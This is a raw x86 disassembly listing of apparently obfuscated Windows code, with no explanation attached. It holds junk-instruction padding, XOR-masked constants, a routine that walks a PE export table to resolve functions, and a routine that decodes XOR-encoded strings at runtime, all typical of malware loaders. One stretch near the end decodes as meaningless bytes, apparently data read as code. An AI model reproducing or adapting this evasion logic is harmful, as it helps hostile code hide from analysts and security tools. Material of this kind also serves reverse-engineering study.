  4234fb:	inc    eax
  4234fc:	ret    
  4234fd:	push   ebp
  4234fe:	mov    ebp,esp
  423500:	push   ecx
  423501:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  423508:	dec    edx
  423509:	mov    eax,DWORD PTR [ebp+0x8]
  42350c:	sbb    DWORD PTR ds:0x42864b,0x3b56
  423516:	movsx  eax,BYTE PTR [eax]
  423519:	xor    edx,edx
  42351b:	xor    edx,DWORD PTR ds:0x428653
  423521:	or     edx,DWORD PTR ds:0x428637
  423527:	mov    DWORD PTR ds:0x428653,edx
  42352d:	mov    edx,0x3272ec
  423532:	mov    ecx,DWORD PTR ds:0x428607
  423538:	adc    DWORD PTR ds:0x42865b,ecx
  42353e:	sub    eax,edx
  423540:	movzx  ecx,WORD PTR ds:0x4285ff
  423547:	sbb    DWORD PTR ds:0x42864f,ecx
  42354d:	mov    ecx,0x75108a4
  423552:	or     DWORD PTR ds:0x4285d3,0x42864b
  42355c:	xor    eax,ecx
  42355e:	cmp    eax,0xf89c85c5
  423563:	mov    DWORD PTR ds:0x42864f,0x82b
  42356d:	jne    0x4235b2
  423573:	adc    DWORD PTR ds:0x428633,ecx
  423579:	mov    eax,DWORD PTR [ebp+0x8]
  42357c:	push   esi
  42357d:	sub    DWORD PTR ds:0x4285e7,edi
  423583:	mov    esi,DWORD PTR [ebp+0x8]
  423586:	and    DWORD PTR ds:0x4285e3,0x244e
  423590:	add    esi,DWORD PTR [eax+0x3c]
  423593:	mov    DWORD PTR [ebp+0x8],esi
  423596:	mov    eax,DWORD PTR [ebp-0x4]
  423599:	mov    esi,DWORD PTR [ebp+0x8]
  42359c:	xor    eax,ecx
  42359e:	add    eax,edx
  4235a0:	cmp    DWORD PTR [esi+0x54],eax
  4235a3:	pop    esi
  4235a4:	je     0x4235b2
  4235aa:	mov    eax,DWORD PTR [ebp+0x8]
  4235ad:	jmp    0x4235b9
  4235b2:	mov    eax,DWORD PTR [ebp-0x4]
  4235b5:	xor    eax,ecx
  4235b7:	add    eax,edx
  4235b9:	leave  
  4235ba:	ret    0x4
  4235bd:	push   ebp
  4235be:	mov    ebp,esp
  4235c0:	sub    esp,0xc
  4235c3:	push   esi
  4235c4:	xor    DWORD PTR ds:0x428617,edi
  4235ca:	mov    esi,0xf89c85b0
  4235cf:	xor    edx,DWORD PTR ds:0x428657
  4235d5:	mov    DWORD PTR [ebp-0x8],esi
  4235d8:	sub    ecx,ecx
  4235da:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  4235e1:	add    ecx,DWORD PTR ds:0x4285e3
  4235e7:	push   edi
  4235e8:	mov    eax,eax
  4235ea:	and    DWORD PTR ds:0x4285ff,0x0
  4235f4:	xor    eax,eax
  4235f6:	add    eax,DWORD PTR ds:0x4285ff
  4235fc:	inc    eax
  4235fd:	mov    ds:0x4285ff,eax
  423602:	cmp    DWORD PTR ds:0x4285ff,0x20
  423609:	ja     0x42362c
  42360f:	jmp    0x42361f
  423614:	push   0x2fb5
  423619:	call   DWORD PTR ds:0x4287a3
  42361f:	cmp    DWORD PTR ds:0x4285ff,0x10
  423626:	jb     0x4235f4
  42362c:	mov    eax,DWORD PTR [ebp-0x4]
  42362f:	and    DWORD PTR ds:0x42862f,0x0
  423639:	jmp    0x42364b
  42363e:	mov    ecx,DWORD PTR ds:0x42862f
  423644:	inc    ecx
  423645:	mov    DWORD PTR ds:0x42862f,ecx
  42364b:	cmp    DWORD PTR ds:0x42862f,0x19
  423652:	jae    0x42367d
  423658:	cmp    DWORD PTR ds:0x42862f,0x22
  42365f:	ja     0x42367d
  423665:	jmp    0x423678
  42366a:	push   DWORD PTR [ebp-0x28]
  42366d:	push   0x428028
  423672:	call   DWORD PTR ds:0x4287a7
  423678:	jmp    0x42363e
  42367d:	mov    edi,DWORD PTR [ebp-0x8]
  423680:	mov    ecx,0x75108a4
  423685:	xor    eax,ecx
  423687:	sbb    edx,DWORD PTR ds:0x428637
  42368d:	xor    edi,ecx
  42368f:	mov    edx,0x3272ec
  423694:	add    edi,edx
  423696:	mov    DWORD PTR ds:0x42861b,0x1914
  4236a0:	add    eax,edx
  4236a2:	mov    DWORD PTR ds:0x42863b,0x6a3e
  4236ac:	imul   eax,edi
  4236af:	mov    DWORD PTR ds:0x428613,ebx
  4236b5:	mov    edi,DWORD PTR [ebp+0xc]
  4236b8:	mov    DWORD PTR ds:0x428647,0x7cb7
  4236c2:	cmp    edi,eax
  4236c4:	je     0x42371b
  4236ca:	not    eax
  4236cc:	mov    DWORD PTR [ebp-0xc],esi
  4236cf:	mov    eax,DWORD PTR [ebp-0xc]
  4236d2:	mov    esi,DWORD PTR [ebp+0xc]
  4236d5:	xor    eax,ecx
  4236d7:	lea    eax,[eax*8+0x19397d8]
  4236de:	mov    eax,DWORD PTR [esi+eax*1]
  4236e1:	mov    DWORD PTR [ebp+0xc],eax
  4236e4:	mov    eax,DWORD PTR [ebp-0x4]
  4236e7:	mov    esi,DWORD PTR [ebp-0x8]
  4236ea:	xor    eax,ecx
  4236ec:	xor    esi,ecx
  4236ee:	add    esi,edx
  4236f0:	add    eax,edx
  4236f2:	imul   eax,esi
  4236f5:	mov    esi,DWORD PTR [ebp+0xc]
  4236f8:	cmp    esi,eax
  4236fa:	je     0x42371b
  423700:	mov    eax,DWORD PTR [ebp-0x4]
  423703:	xor    eax,ecx
  423705:	mov    ecx,DWORD PTR [ebp+0xc]
  423708:	add    eax,edx
  42370a:	imul   eax,ecx
  42370d:	add    eax,DWORD PTR [ebp+0x8]
  423710:	mov    DWORD PTR [ebp+0xc],eax
  423713:	mov    eax,DWORD PTR [ebp+0xc]
  423716:	jmp    0x42372c
  42371b:	mov    eax,DWORD PTR [ebp-0x4]
  42371e:	mov    esi,DWORD PTR [ebp-0x8]
  423721:	xor    esi,ecx
  423723:	xor    eax,ecx
  423725:	add    esi,edx
  423727:	add    eax,edx
  423729:	imul   eax,esi
  42372c:	pop    edi
  42372d:	pop    esi
  42372e:	leave  
  42372f:	ret    0x8
  423732:	push   ebp
  423733:	mov    ebp,esp
  423735:	sub    esp,0x38
  423738:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  42373f:	sub    DWORD PTR ds:0x428607,edi
  423745:	push   ebx
  423746:	adc    DWORD PTR ds:0x4285d3,0x5ead
  423750:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  423757:	mov    eax,DWORD PTR [ebp-0x4]
  42375a:	push   esi
  42375b:	movzx  esi,WORD PTR ds:0x42865f
  423762:	or     esi,DWORD PTR ds:0x428643
  423768:	mov    DWORD PTR ds:0x42865f,esi
  42376e:	mov    esi,0x75108a4
  423773:	xor    eax,esi
  423775:	push   edi
  423776:	movzx  edi,WORD PTR ds:0x42862f
  42377d:	add    edi,DWORD PTR ds:0x4285d3
  423783:	mov    DWORD PTR ds:0x42862f,edi
  423789:	mov    edi,0x3272ec
  42378e:	add    eax,edi
  423790:	and    DWORD PTR ds:0x42864f,0x1fff
  42379a:	mov    DWORD PTR [ebp-0x1c],eax
  42379d:	mov    eax,ds:0x4285d7
  4237a2:	sbb    DWORD PTR ds:0x42866b,eax
  4237a8:	mov    eax,DWORD PTR [ebp+0x14]
  4237ab:	test   eax,eax
  4237ad:	mov    DWORD PTR ds:0x42861b,0x61b5
  4237b7:	je     0x4237c7
  4237bd:	xor    eax,eax
  4237bf:	mov    eax,DWORD PTR [ebp+0x14]
  4237c2:	mov    eax,DWORD PTR [eax]
  4237c4:	mov    DWORD PTR [ebp-0x1c],eax
  4237c7:	and    DWORD PTR ds:0x42867b,ecx
  4237cd:	mov    eax,DWORD PTR [ebp-0x4]
  4237d0:	xor    eax,esi
  4237d2:	adc    DWORD PTR ds:0x4285eb,edx
  4237d8:	add    eax,edi
  4237da:	and    DWORD PTR ds:0x4285eb,ecx
  4237e0:	mov    DWORD PTR [ebp-0x8],eax
  4237e3:	xor    eax,eax
  4237e5:	mov    eax,DWORD PTR [ebp-0xc]
  4237e8:	sub    DWORD PTR ds:0x428607,0x2824
  4237f2:	xor    eax,esi
  4237f4:	or     DWORD PTR ds:0x428663,0xb3a
  4237fe:	add    eax,edi
  423800:	sub    DWORD PTR ds:0x428617,edx
  423806:	mov    DWORD PTR [ebp-0x24],eax
  423809:	mov    ebx,DWORD PTR ds:0x428667
  42380f:	and    DWORD PTR ds:0x428603,ebx
  423815:	mov    eax,DWORD PTR [ebp-0x4]
  423818:	xor    eax,esi
  42381a:	add    eax,edi
  42381c:	and    DWORD PTR ds:0x428637,0x0
  423826:	mov    ebx,DWORD PTR ds:0x428637
  42382c:	inc    ebx
  42382d:	mov    DWORD PTR ds:0x428637,ebx
  423833:	cmp    DWORD PTR ds:0x428637,0x23
  42383a:	ja     0x423863
  423840:	jmp    0x423856
  423845:	push   0x428070
  42384a:	push   DWORD PTR [ebp-0x14]
  42384d:	push   DWORD PTR [ebp-0x14]
  423850:	call   DWORD PTR ds:0x4287ab
  423856:	cmp    DWORD PTR ds:0x428637,0x17
  42385d:	jb     0x423826
  423863:	mov    DWORD PTR [ebp-0x30],eax
  423866:	mov    ebx,DWORD PTR [ebp-0x4]
  423869:	xor    ebx,esi
  42386b:	add    ebx,edi
  42386d:	adc    eax,DWORD PTR ds:0x428673
  423873:	mov    eax,DWORD PTR [ebp-0x24]
  423876:	sub    eax,edi
  423878:	lea    ecx,[ebx-0x3272ec]
  42387e:	add    DWORD PTR ds:0x42861f,0x137d
  423888:	xor    eax,esi
  42388a:	adc    DWORD PTR ds:0x428667,0x428613
  423894:	xor    ecx,esi
  423896:	cmp    ecx,eax
  423898:	je     0x423bbd
  42389e:	and    DWORD PTR ds:0x428667,0x0
  4238a8:	mov    eax,ds:0x428667
  4238ad:	inc    eax
  4238ae:	mov    ds:0x428667,eax
  4238b3:	cmp    DWORD PTR ds:0x428667,0x22
  4238ba:	jge    0x4238dd
  4238c0:	jmp    0x4238d0
  4238c5:	push   0x428056
  4238ca:	call   DWORD PTR ds:0x4287af
  4238d0:	cmp    DWORD PTR ds:0x428667,0x14
  4238d7:	jb     0x4238a8
  4238dd:	mov    eax,DWORD PTR [ebp-0x4]
  4238e0:	add    DWORD PTR ds:0x42862b,0x428657
  4238ea:	xor    eax,esi
  4238ec:	add    eax,edi
  4238ee:	mov    DWORD PTR ds:0x42863b,0x5900
  4238f8:	cmp    ebx,eax
  4238fa:	mov    DWORD PTR ds:0x42864b,0x1e0f
  423904:	jne    0x423b0b
  42390a:	sbb    DWORD PTR ds:0x42866f,0x4285df
  423914:	push   DWORD PTR [ebp+0x8]
  423917:	sub    DWORD PTR ds:0x428653,0x2050
  423921:	call   0x4234fd
  423926:	mov    DWORD PTR [ebp-0x14],eax
  423929:	mov    eax,DWORD PTR [ebp-0x4]
  42392c:	xor    DWORD PTR ds:0x428603,0x42865b
  423936:	mov    ecx,DWORD PTR [ebp-0x14]
  423939:	sbb    DWORD PTR ds:0x42866f,0x5022
  423943:	xor    eax,esi
  423945:	adc    DWORD PTR ds:0x42867b,0x428657
  42394f:	add    eax,edi
  423951:	mov    DWORD PTR ds:0x4285e7,0x3cb8
  42395b:	cmp    ecx,eax
  42395d:	je     0x423ca0
  423963:	sbb    DWORD PTR ds:0x4285ef,0x428613
  42396d:	push   DWORD PTR [ebp-0x14]
  423970:	or     DWORD PTR ds:0x42866b,0x13a4
  42397a:	push   DWORD PTR [ebp+0x8]
  42397d:	and    DWORD PTR ds:0x4285cf,0x6488
  423987:	call   0x4235bd
  42398c:	mov    DWORD PTR [ebp-0x14],eax
  42398f:	mov    ecx,DWORD PTR ds:0x4286c7
  423995:	mov    eax,ds:0x4286ff
  42399a:	sub    ecx,eax
  42399c:	sub    ecx,DWORD PTR [ecx+eax*1]
  42399f:	mov    eax,DWORD PTR [ebp-0x4]
  4239a2:	mov    DWORD PTR ds:0x4285e3,0x1e
  4239ac:	cmp    DWORD PTR ds:0x4285e3,0x0
  4239b3:	je     0x4239ed
  4239b9:	cmp    DWORD PTR ds:0x4285e3,0x27
  4239c0:	ja     0x4239ed
  4239c6:	jmp    0x4239db
  4239cb:	push   0x4c54
  4239d0:	push   0x42862f
  4239d5:	call   DWORD PTR ds:0x4287b3
  4239db:	mov    ecx,DWORD PTR ds:0x4285e3
  4239e1:	dec    ecx
  4239e2:	mov    DWORD PTR ds:0x4285e3,ecx
  4239e8:	jmp    0x4239ac
  4239ed:	mov    ecx,DWORD PTR [ebp-0x14]
  4239f0:	mov    DWORD PTR ds:0x4285f3,0x1814
  4239fa:	xor    eax,esi
  4239fc:	add    DWORD PTR ds:0x428657,0x428637
  423a06:	add    eax,edi
  423a08:	mov    DWORD PTR ds:0x42863f,0xaaa
  423a12:	cmp    ecx,eax
  423a14:	mov    DWORD PTR ds:0x42860f,0x626d
  423a1e:	je     0x423ca0
  423a24:	mov    eax,DWORD PTR [ebp-0x14]
  423a27:	or     ecx,0x1da9
  423a2d:	mov    eax,DWORD PTR [eax+0x18]
  423a30:	sub    DWORD PTR ds:0x42865b,ecx
  423a36:	mov    DWORD PTR [ebp-0x24],eax
  423a39:	and    eax,0x4d45
  423a3e:	mov    eax,DWORD PTR [ebp-0x14]
  423a41:	adc    ecx,0x37bd
  423a47:	mov    ecx,DWORD PTR [ebp+0x8]
  423a4a:	add    ecx,DWORD PTR [eax+0x20]
  423a4d:	movzx  eax,WORD PTR ds:0x4285d3
  423a54:	sbb    DWORD PTR ds:0x428657,eax
  423a5a:	mov    DWORD PTR [ebp-0x2c],ecx
  423a5d:	and    DWORD PTR ds:0x428627,0x1b49
  423a67:	mov    eax,DWORD PTR [ebp-0x14]
  423a6a:	mov    ecx,DWORD PTR [ebp+0x8]
  423a6d:	and    DWORD PTR ds:0x4285db,0x4285ef
  423a77:	add    ecx,DWORD PTR [eax+0x24]
  423a7a:	adc    DWORD PTR ds:0x4285e3,0x7baf
  423a84:	mov    DWORD PTR [ebp-0x34],ecx
  423a87:	and    DWORD PTR ds:0x428623,0x0
  423a91:	jmp    0x423aa4
  423a96:	xor    eax,eax
  423a98:	xor    eax,DWORD PTR ds:0x428623
  423a9e:	inc    eax
  423a9f:	mov    ds:0x428623,eax
  423aa4:	cmp    DWORD PTR ds:0x428623,0x1a
  423aab:	jae    0x423ae6
  423ab1:	cmp    DWORD PTR ds:0x428623,0xd
  423ab8:	jb     0x423ae6
  423abe:	jmp    0x423ac9
  423ac3:	call   DWORD PTR ds:0x4287b7
  423ac9:	cmp    DWORD PTR ds:0x428623,0xc
  423ad0:	jne    0x423ae1
  423ad6:	mov    eax,ds:0x428623
  423adb:	inc    eax
  423adc:	mov    ds:0x428623,eax
  423ae1:	jmp    0x423a96
  423ae6:	mov    eax,DWORD PTR [ebp-0x14]
  423ae9:	mov    ecx,DWORD PTR [ebp+0x8]
  423aec:	xor    DWORD PTR ds:0x428603,0x1ba
  423af6:	add    ecx,DWORD PTR [eax+0x1c]
  423af9:	mov    DWORD PTR [ebp-0x14],ecx
  423afc:	mov    DWORD PTR ds:0x4285df,0x6d54
  423b06:	jmp    0x423c5e
  423b0b:	sbb    DWORD PTR ds:0x428657,0x267e
  423b15:	mov    eax,DWORD PTR [ebp-0x2c]
  423b18:	and    DWORD PTR ds:0x42865f,0x0
  423b22:	mov    ecx,DWORD PTR ds:0x42865f
  423b28:	inc    ecx
  423b29:	mov    DWORD PTR ds:0x42865f,ecx
  423b2f:	cmp    DWORD PTR ds:0x42865f,0x24
  423b36:	jl     0x423b59
  423b3c:	jmp    0x423b4c
  423b41:	push   0x3051
  423b46:	call   DWORD PTR ds:0x4287bb
  423b4c:	cmp    DWORD PTR ds:0x42865f,0x1e
  423b53:	jb     0x423b22
  423b59:	mov    ecx,DWORD PTR [ebp+0x8]
  423b5c:	add    DWORD PTR ds:0x428617,0x4285ef
  423b66:	add    ecx,DWORD PTR [eax+ebx*4]
  423b69:	movzx  eax,BYTE PTR ds:0x4285d3
  423b70:	or     eax,DWORD PTR ds:0x428633
  423b76:	mov    ds:0x4285d3,eax
  423b7b:	mov    DWORD PTR [ebp-0x28],ecx
  423b7e:	mov    eax,DWORD PTR [ebp-0x4]
  423b81:	xor    DWORD PTR ds:0x42860b,0x227b
  423b8b:	mov    ecx,DWORD PTR [ebp-0x28]
  423b8e:	mov    DWORD PTR ds:0x428657,0x956
  423b98:	xor    eax,esi
  423b9a:	add    DWORD PTR ds:0x428637,0x428663
  423ba4:	add    eax,edi
  423ba6:	mov    DWORD PTR ds:0x42862f,0x1972
  423bb0:	cmp    ecx,eax
  423bb2:	je     0x423c5e
  423bb8:	jmp    0x423c1d
  423bbd:	mov    eax,DWORD PTR [ebp-0x4]
  423bc0:	mov    DWORD PTR ds:0x42866f,0x10fc
  423bca:	mov    ecx,DWORD PTR [ebp-0x8]
  423bcd:	or     DWORD PTR ds:0x42866f,0x42865f
  423bd7:	xor    eax,esi
  423bd9:	adc    DWORD PTR ds:0x4285eb,0x240b
  423be3:	add    eax,edi
  423be5:	mov    DWORD PTR ds:0x428657,0x63ac
  423bef:	cmp    ecx,eax
  423bf1:	mov    eax,DWORD PTR [ebp-0x4]
  423bf4:	je     0x423ca3
  423bfa:	mov    ecx,DWORD PTR [ebp-0x30]
  423bfd:	xor    eax,esi
  423bff:	mov    DWORD PTR ds:0x428613,0x1e55
  423c09:	add    eax,edi
  423c0b:	mov    DWORD PTR ds:0x428637,0x6483
  423c15:	cmp    ecx,eax
  423c17:	je     0x423cac
  423c1d:	adc    DWORD PTR ds:0x428603,0x42865b
  423c27:	lea    eax,[ebp-0x8]
  423c2a:	sub    DWORD PTR ds:0x428603,0x42860b
  423c34:	push   eax
  423c35:	sbb    DWORD PTR ds:0x42861b,0x4285f7
  423c3f:	push   DWORD PTR [ebp-0x28]
  423c42:	sub    DWORD PTR ds:0x428617,0x428667
  423c4c:	push   DWORD PTR [ebp+0xc]
  423c4f:	adc    DWORD PTR ds:0x42863f,0x428633
  423c59:	call   0x40f467
  423c5e:	sub    DWORD PTR ds:0x4285d7,0x3834
  423c68:	mov    eax,DWORD PTR [ebp-0x4]
  423c6b:	mov    ecx,DWORD PTR [ebp-0x8]
  423c6e:	xor    eax,esi
  423c70:	add    eax,edi
  423c72:	cmp    ecx,eax
  423c74:	je     0x423c8f
  423c7a:	mov    eax,DWORD PTR [ebp-0x34]
  423c7d:	movzx  eax,WORD PTR [eax+ebx*2]
  423c81:	mov    ecx,DWORD PTR [ebp-0x14]
  423c84:	mov    eax,DWORD PTR [ecx+eax*4]
  423c87:	mov    DWORD PTR [ebp-0x38],eax
  423c8a:	jmp    0x423bbd
  423c8f:	mov    eax,DWORD PTR [ebp-0xc]
  423c92:	xor    eax,esi
  423c94:	lea    ebx,[ebx+eax*1+0x3272ec]
  423c9b:	jmp    0x42386d
  423ca0:	mov    eax,DWORD PTR [ebp-0x4]
  423ca3:	xor    eax,esi
  423ca5:	add    eax,edi
  423ca7:	jmp    0x423dc9
  423cac:	mov    eax,DWORD PTR [ebp-0x38]
  423caf:	add    eax,DWORD PTR [ebp+0x8]
  423cb2:	mov    DWORD PTR [ebp-0x18],eax
  423cb5:	mov    eax,DWORD PTR [ebp-0x1c]
  423cb8:	test   eax,eax
  423cba:	je     0x423d54
  423cc0:	mov    DWORD PTR [ebp-0x20],0x0
  423cc7:	push   0x3
  423cc9:	xor    edx,edx
  423ccb:	pop    edx
  423ccc:	add    edx,0x8
  423ccf:	push   edx
  423cd0:	pop    ecx
  423cd1:	push   0x6
  423cd3:	dec    ecx
  423cd4:	pop    ebx
  423cd5:	dec    ebx
  423cd6:	xchg   ebx,ecx
  423cd8:	sub    ebx,ecx
  423cda:	xchg   ebx,ecx
  423cdc:	dec    ecx
  423cdd:	mov    eax,DWORD PTR [ebp-0x1c]
  423ce0:	imul   eax,ecx
  423ce3:	sub    esp,eax
  423ce5:	mov    DWORD PTR [ebp-0x20],esp
  423ce8:	mov    eax,DWORD PTR [ebp-0x4]
  423ceb:	xor    eax,esi
  423ced:	add    eax,edi
  423cef:	jmp    0x423d2d
  423cf4:	mov    ecx,DWORD PTR [ebp-0xc]
  423cf7:	mov    eax,DWORD PTR [ebp+0x8]
  423cfa:	mov    edx,DWORD PTR [ebp+0x14]
  423cfd:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  423d01:	xor    ecx,esi
  423d03:	add    ecx,edi
  423d05:	xor    edx,edx
  423d07:	div    ecx
  423d09:	mov    ecx,DWORD PTR [ebp-0x4]
  423d0c:	xor    ecx,esi
  423d0e:	lea    eax,[ecx+eax*1+0x3272ec]
  423d15:	mov    ecx,DWORD PTR [ebp+0x8]
  423d18:	mov    edx,DWORD PTR [ebp-0x20]
  423d1b:	mov    DWORD PTR [edx+ecx*4],eax
  423d1e:	mov    eax,DWORD PTR [ebp-0xc]
  423d21:	mov    ecx,DWORD PTR [ebp+0x8]
  423d24:	xor    eax,esi
  423d26:	lea    eax,[eax+ecx*1+0x3272ec]
  423d2d:	mov    DWORD PTR [ebp+0x8],eax
  423d30:	mov    eax,DWORD PTR [ebp-0xc]
  423d33:	mov    ecx,DWORD PTR [ebp+0x14]
  423d36:	xor    eax,esi
  423d38:	add    eax,edi
  423d3a:	imul   eax,DWORD PTR [ecx]
  423d3d:	mov    ecx,DWORD PTR [ebp-0x4]
  423d40:	mov    edx,DWORD PTR [ebp+0x8]
  423d43:	xor    ecx,esi
  423d45:	lea    ecx,[ecx+edx*1+0x3272ec]
  423d4c:	cmp    ecx,eax
  423d4e:	jne    0x423cf4
  423d54:	mov    eax,DWORD PTR [ebp-0x4]
  423d57:	xor    eax,esi
  423d59:	add    eax,edi
  423d5b:	mov    DWORD PTR [ebp-0x10],eax
  423d5e:	mov    ebx,0x65655
  423d63:	add    ebx,0x3234
  423d69:	xchg   ebx,esi
  423d6b:	xor    ebx,ebx
  423d6d:	push   esi
  423d6e:	mov    esi,ebx
  423d70:	pop    ebx
  423d71:	mov    edx,esi
  423d73:	add    ebx,0x1002
  423d79:	lea    eax,[ebp-0x18]
  423d7c:	add    edx,eax
  423d7e:	add    edx,0x5
  423d81:	push   edx
  423d82:	inc    esi
  423d83:	pop    ecx
  423d84:	dec    ecx
  423d85:	xchg   ecx,eax
  423d86:	dec    eax
  423d87:	xchg   ecx,eax
  423d88:	dec    ecx
  423d89:	xchg   ecx,edx
  423d8b:	dec    edx
  423d8c:	push   edx
  423d8d:	mov    edx,ebx
  423d8f:	pop    ebx
  423d90:	dec    ebx
  423d91:	call   DWORD PTR [ebx]
  423d93:	cmp    DWORD PTR [ebp+0x10],esi
  423d96:	je     0x423db5
  423d9c:	xchg   edx,eax
  423d9d:	push   0xb
  423d9f:	pop    ecx
  423da0:	push   0x4
  423da2:	pop    ebx
  423da3:	inc    ebx
  423da4:	xchg   ebx,ecx
  423da6:	sub    ebx,ecx
  423da8:	xchg   ebx,ecx
  423daa:	dec    ecx
  423dab:	dec    ecx
  423dac:	mov    eax,DWORD PTR [ebp-0x1c]
  423daf:	imul   eax,ecx
  423db2:	add    esp,eax
  423db4:	xchg   edx,eax
  423db5:	push   eax
  423db6:	xor    ebx,ebx
  423db8:	mov    edx,esp
  423dba:	dec    edx
  423dbb:	inc    ebx
  423dbc:	add    ebx,DWORD PTR [edx+ebx*1]
  423dbf:	dec    ebx
  423dc0:	xor    edx,edx
  423dc2:	add    DWORD PTR [ebp-0x10],ebx
  423dc5:	pop    ebx
  423dc6:	mov    eax,DWORD PTR [ebp-0x10]
  423dc9:	pop    edi
  423dca:	pop    esi
  423dcb:	pop    ebx
  423dcc:	leave  
  423dcd:	ret    0x10
  423dd0:	add    BYTE PTR [eax],al
  423dd2:	add    BYTE PTR [eax],al
  423dd4:	mov    bl,0x8a
  423dd6:	test   BYTE PTR [ebp+0x0],0x0
  423dda:	add    BYTE PTR [eax],al
  423ddc:	add    al,BYTE PTR [eax]
  423dde:	add    BYTE PTR [eax],al
  423de0:	xor    al,0x0
  423de2:	add    BYTE PTR [eax],al
  423de4:	lock cmp eax,0x31f00002
  423dea:	add    al,BYTE PTR [eax]
  423dec:	add    BYTE PTR [eax],al
  423dee:	add    BYTE PTR [eax],al
  423df0:	push   edx
  423df1:	push   ebx
  423df2:	inc    esp
  423df3:	push   ebx
  423df4:	lds    esi,FWORD PTR [eax-0x439f4043]
  423dfa:	mov    dh,0x4f
  423dfc:	test   eax,0x25a83a66
  423e01:	test   eax,0x1c6c5
  423e06:	add    BYTE PTR [eax],al
  423e08:	inc    ebp
  423e09:	cmp    bl,BYTE PTR [edx+edx*2+0x61]
  423e0d:	ja     0x423e2f
  423e0f:	inc    esp
  423e10:	popa   
  423e11:	je     0x423e74
  423e13:	pop    esp
  423e14:	inc    ebp
  423e15:	outs   dx,BYTE PTR ds:[esi]
  423e16:	arpl   WORD PTR [edi+0x64],bp
  423e19:	gs fs inc esp
  423e1c:	popa   
  423e1d:	je     0x423e80
  423e1f:	inc    esi
  423e20:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x81ec558b
  423e28:	in     al,dx
  423e29:	or     BYTE PTR [ecx],al
  423e2b:	add    BYTE PTR [eax],al
  423e2d:	push   ebx
  423e2e:	mov    eax,ebx
  423e30:	xchg   ecx,eax
  423e31:	mov    eax,DWORD PTR [ebp+0x8]
  423e34:	cmp    eax,0xf89c85b0
  423e39:	jne    0x4242c0
  423e3f:	mov    eax,DWORD PTR [ebp+0xc]
  423e42:	cmp    eax,0xf89c85b1
  423e47:	jne    0x4242c0
  423e4d:	mov    eax,DWORD PTR [ebp+0x24]
  423e50:	mov    DWORD PTR [ebp-0x4],eax
  423e53:	mov    BYTE PTR [ebp-0x18],0x13
  423e57:	mov    BYTE PTR [ebp-0x17],0x1e
  423e5b:	mov    BYTE PTR [ebp-0x16],0x15
  423e5f:	mov    BYTE PTR [ebp-0x15],0x4f
  423e63:	mov    BYTE PTR [ebp-0x14],0x4c
  423e67:	mov    BYTE PTR [ebp-0x13],0x7a
  423e6b:	mov    BYTE PTR [ebp-0x20],0x1
  423e6f:	mov    BYTE PTR [ebp-0x1f],0xf
  423e73:	mov    BYTE PTR [ebp-0x1e],0x11
  423e77:	mov    BYTE PTR [ebp-0x1d],0xc
  423e7b:	mov    BYTE PTR [ebp-0x1c],0x4f
  423e7f:	mov    BYTE PTR [ebp-0x1b],0x4c
  423e83:	mov    BYTE PTR [ebp-0x1a],0x7a
  423e87:	mov    BYTE PTR [ebp-0x28],0xf
  423e8b:	mov    BYTE PTR [ebp-0x27],0x12
  423e8f:	mov    BYTE PTR [ebp-0x26],0x16
  423e93:	mov    BYTE PTR [ebp-0x25],0x3
  423e97:	mov    BYTE PTR [ebp-0x24],0x1d
  423e9b:	mov    BYTE PTR [ebp-0x23],0xa
  423e9f:	push   esi
  423ea0:	mov    BYTE PTR [ebp-0x22],0x15
  423ea4:	mov    BYTE PTR [ebp-0x21],0x7a
  423ea8:	xor    esi,esi
  423eaa:	mov    eax,0xfd
  423eaf:	lea    ecx,[ebp+esi*1-0x18]
  423eb3:	movzx  edx,BYTE PTR [ecx]
  423eb6:	xor    edx,0x79
  423eb9:	add    edx,eax
  423ebb:	inc    esi
  423ebc:	mov    BYTE PTR [ecx],dl
  423ebe:	cmp    esi,0x6
  423ec1:	jb     0x423eaf
  423ec3:	xor    esi,esi
  423ec5:	lea    ecx,[ebp+esi*1-0x20]
  423ec9:	movzx  edx,BYTE PTR [ecx]
  423ecc:	xor    edx,0x79
  423ecf:	add    edx,eax
  423ed1:	inc    esi
  423ed2:	mov    BYTE PTR [ecx],dl
  423ed4:	cmp    esi,0x7
  423ed7:	jb     0x423ec5
  423ed9:	xor    esi,esi
  423edb:	lea    ecx,[ebp+esi*1-0x28]
  423edf:	movzx  edx,BYTE PTR [ecx]
  423ee2:	xor    edx,0x79
  423ee5:	add    edx,eax
  423ee7:	inc    esi
  423ee8:	mov    BYTE PTR [ecx],dl
  423eea:	cmp    esi,0x8
  423eed:	jb     0x423edb
  423eef:	lea    eax,[ebp-0x2c]
  423ef2:	mov    DWORD PTR [ebp-0x8],eax
  423ef5:	mov    ecx,DWORD PTR [ebp-0x8]
  423ef8:	mov    eax,0x7113fcce
  423efd:	mov    DWORD PTR [ecx],eax
  423eff:	mov    ecx,DWORD PTR [ebp-0x2c]
  423f02:	push   edi
  423f03:	mov    esi,0x4e3e
  423f08:	mov    ebx,0x3272ec
  423f0d:	cmp    ecx,eax
  423f0f:	jne    0x423fda
  423f15:	lea    eax,[esi+0x29]
  423f18:	mov    WORD PTR [ebp-0x78],ax
  423f1c:	mov    eax,esi
  423f1e:	mov    WORD PTR [ebp-0x76],ax
  423f22:	add    eax,0x3b
  423f25:	mov    WORD PTR [ebp-0x74],ax
  423f29:	lea    eax,[esi-0x6]
  423f2c:	mov    WORD PTR [ebp-0x72],ax
  423f30:	add    eax,0x47
  423f33:	mov    ecx,eax
  423f35:	lea    eax,[esi-0x1d]
  423f38:	mov    WORD PTR [ebp-0x66],ax
  423f3c:	mov    eax,esi
  423f3e:	mov    WORD PTR [ebp-0x64],ax
  423f42:	add    eax,0xffffffe4
  423f45:	mov    WORD PTR [ebp-0x62],ax
  423f49:	mov    eax,0x44b
  423f4e:	mov    WORD PTR [ebp-0x60],ax
  423f52:	mov    eax,0x5664
  423f57:	mov    WORD PTR [ebp-0x5e],ax
  423f5b:	mov    eax,0x6104
  423f60:	mov    WORD PTR [ebp-0x5c],ax
  423f64:	lea    eax,[ebp-0xe0]
  423f6a:	push   eax
  423f6b:	mov    eax,DWORD PTR [ebp+0xc]
  423f6e:	mov    edi,0x75108a4
  423f73:	xor    eax,edi
  423f75:	add    eax,ebx
  423f77:	push   eax
  423f78:	mov    WORD PTR [ebp-0x70],cx
  423f7c:	lea    ecx,[esi-0x1a]
  423f7f:	mov    edx,ecx
